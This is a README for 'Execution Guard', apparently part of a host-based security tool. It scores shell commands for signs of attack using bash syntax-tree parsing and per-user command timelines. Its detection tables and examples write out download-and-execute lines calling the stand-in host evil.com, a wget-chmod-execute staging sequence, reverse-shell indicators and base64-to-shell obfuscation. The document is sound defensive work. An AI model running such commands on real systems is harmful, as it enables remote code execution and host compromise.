# Execution Guard

Monitors command execution patterns on the host and detects suspicious activity
using **structural command analysis (AST)** and **lightweight behavioral scoring**.

## What it detects

| Pattern | Risk Score | Severity |
|---------|-----------|----------|
| Download + execute pipeline (`curl ... \| sh`) | 40 | High |
| Network pipe (downloader piped to any command) | 35 | Low/High |
| Execution from `/tmp`, `/dev/shm`, `/var/tmp` | 30 | Low |
| Reverse shell (`/dev/tcp/`, `nc -e`, `bash -i`) | 50 | High/Critical |
| sudo escalation context | 25 | (modifier) |
| Script persistence (`crontab`, `.bashrc`, `systemctl enable`) | 20 | Low |
| Obfuscated command (`base64 -d \| sh`, `eval`, etc.) | 30 | Low/High |
| Download → chmod → execute **sequence** (timeline bonus) | +25 | adds to total |

### Severity thresholds

| Score | Severity | Action |
|-------|----------|--------|
| < 30 | — | Ignored |
| 30–59 | Low | Incident emitted, logged |
| 60–79 | High | Incident emitted, AI pipeline notified |
| ≥ 80 | Critical | Incident emitted, AI pipeline notified |

## How it works

### 1. Structural AST analysis (`tree-sitter-bash`)

Commands are parsed using the [tree-sitter-bash](https://github.com/tree-sitter/tree-sitter-bash)
grammar rather than simple string matching. This allows reliable detection of
pipeline patterns regardless of quoting or argument ordering.

Example: for `curl https://evil.com/install | sh`, the AST is:

```
(pipeline
  (command name: "curl" argument: "https://evil.com/install")
  (command name: "sh"))
```

The detector walks this tree, finds a **pipeline** containing a downloader (`curl`,
`wget`, etc.) followed by a shell executor (`sh`, `bash`, etc.), and emits a
`DownloadAndExecute` signal (+40 points).

AST analysis is applied to:
- `bash -c "..."` / `sh -c "..."` — inline script in argument
- `bash script.sh` — local script file content (up to 8 KB)
- `sudo <command>` — full command text from journald

### 2. Argv-based analysis (fast path)

Individual process execution events (`shell.command_exec` from auditd) are
analyzed by inspecting the argv vector directly:

- **argv[0]** path: checked against known temp directories
- **All args** joined: scanned for reverse shell indicators, obfuscation patterns,
  and persistence indicators

This is O(1) per event and adds no parser overhead for normal commands.

### 3. Per-user command timeline

A short rolling window of commands per user is maintained in memory. When a
complete **download → chmod +x → execute** sequence is detected within the
window, a **sequence bonus** (+25 points) is added. This allows detection of
staged attacks that individually appear harmless.

Example sequence:
```
wget -O /tmp/payload http://evil.com/payload   ← Download
chmod +x /tmp/payload                          ← Chmod
./payload                                       ← Execute → sequence bonus
```

## Event sources

| Source | Event Kind | Collector |
|--------|-----------|-----------|
| auditd EXECVE records | `shell.command_exec` | `exec_audit` |
| sudo audit trail | `sudo.command` | `journald` |

## Configuration

```toml
[collectors.exec_audit]
enabled = true
path    = "/var/log/audit/audit.log"

[collectors.journald]
enabled = true
units   = ["sshd", "sudo", "kernel"]

[detectors.execution_guard]
enabled        = true
mode           = "observe"    # only mode implemented in v0.1
window_seconds = 300
```

### Requirements

- **auditd** must be running and generating EXECVE records
- The `innerwarden` process must have read access to `/var/log/audit/audit.log`
  (add user to `audit` or `adm` group as appropriate)
- `sudo` logging must be enabled in journald (default on most systemd distributions)

## Produced incidents

Incident type: `suspicious_execution`

```json
{
  "kind": "suspicious_execution",
  "user": "deploy",
  "command": "curl https://evil.com | sh",
  "process": "bash",
  "risk_score": 75,
  "signals": ["sudo_escalation", "download_and_execute"],
  "details": [
    { "signal": "sudo_escalation", "score": 25, "detail": "command executed via sudo" },
    { "signal": "download_and_execute", "score": 40, "detail": "dangerous pipeline: curl | sh" }
  ]
}
```

## Important principles

**AI is optional and secondary.** Detection works fully with AI disabled.
The AST + risk scoring engine is the primary detection mechanism.

**Fail-open.** If the parser cannot parse a command, or a script file cannot be
read, the event is still analyzed via argv-based rules. No event is dropped due
to a parser error.

**Observe mode only (v0.1).** This version detects and alerts. No automatic
blocking or user suspension occurs. This is intentional — execution events
require human review before automated response.

**Privacy-safe defaults.** TTY input capture (`include_tty`) is disabled by
default. EXECVE recording captures command names and arguments, not stdin/stdout
content.

## Future roadmap

### `contain` mode *(planned)*
When a Critical incident is detected, automatically:
- Invoke `suspend-user-sudo` skill (revoke sudo temporarily via sudoers drop-in)
- Attempt to isolate the user session (kill suspect processes, disconnect TTY)

### `strict` mode *(planned)*
Pre-execution command interception:
- Integration with eBPF or Linux Security Module (LSM) hooks
- Deny execution *before* the command runs, not just alert after
- Configurable allowlist for known-safe execution patterns

### AI-assisted script analysis *(planned)*
For inline scripts and downloaded script files, the full AST + source can be
sent to the AI provider for deeper semantic analysis:
- Understand what the script *does*, not just what patterns it matches
- Identify novel obfuscation techniques
- Provide human-readable incident narrative
